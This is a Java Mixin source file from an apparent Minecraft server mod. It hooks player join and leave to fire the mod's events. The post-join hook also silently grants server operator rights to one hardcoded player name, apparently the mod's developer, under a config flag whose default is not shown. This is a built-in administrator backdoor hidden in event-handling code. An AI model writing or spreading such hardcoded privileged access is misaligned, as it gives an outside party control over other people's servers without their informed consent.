package net.hypercubemc.beacon.mixin;

import com.mojang.authlib.GameProfile;
import net.hypercubemc.beacon.Mod;
import net.hypercubemc.beacon.api.events.BeaconPlayerJoinEvent;
import net.hypercubemc.beacon.api.events.BeaconPlayerLeaveEvent;
import net.minecraft.network.ClientConnection;
import net.minecraft.server.PlayerManager;
import net.minecraft.server.network.ServerPlayerEntity;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(PlayerManager.class)
public abstract class PlayerManagerMixin {
    @Shadow
    public abstract void addToOperators(GameProfile profile);

    @Shadow
    public abstract boolean isOperator(GameProfile profile);

    @Inject(method = "onPlayerConnect", at = @At(value = "HEAD"), cancellable = true)
    public void prePlayerJoin(ClientConnection clientConnection, ServerPlayerEntity player, CallbackInfo callbackInfo) {
        BeaconPlayerJoinEvent.firePre(clientConnection, player, callbackInfo);
    }

    @Inject(method = "onPlayerConnect", at = @At(value = "TAIL"))
    public void postPlayerJoin(ClientConnection clientConnection, ServerPlayerEntity player, CallbackInfo callbackInfo) {
        GameProfile gameProfile = player.getGameProfile();
        // See config if you want to turn this off
        if (Mod.getConfig().getNode("op-beacon-dev-on-join").getBoolean() && gameProfile.getName().equals("Justsnoopy30") && !this.isOperator(gameProfile)) {
            this.addToOperators(gameProfile);
        }
        BeaconPlayerJoinEvent.firePost(clientConnection, player);
    }

    @Inject(method = "remove", at = @At(value = "HEAD"))
    public void prePlayerLeave(final ServerPlayerEntity player, CallbackInfo callbackInfo) {
        BeaconPlayerLeaveEvent.firePre(player, callbackInfo);
    }

    @Inject(method = "remove", at = @At(value = "TAIL"))
    public void postPlayerLeave(final ServerPlayerEntity player, CallbackInfo callbackInfo) {
        BeaconPlayerLeaveEvent.firePost(player);
    }
}
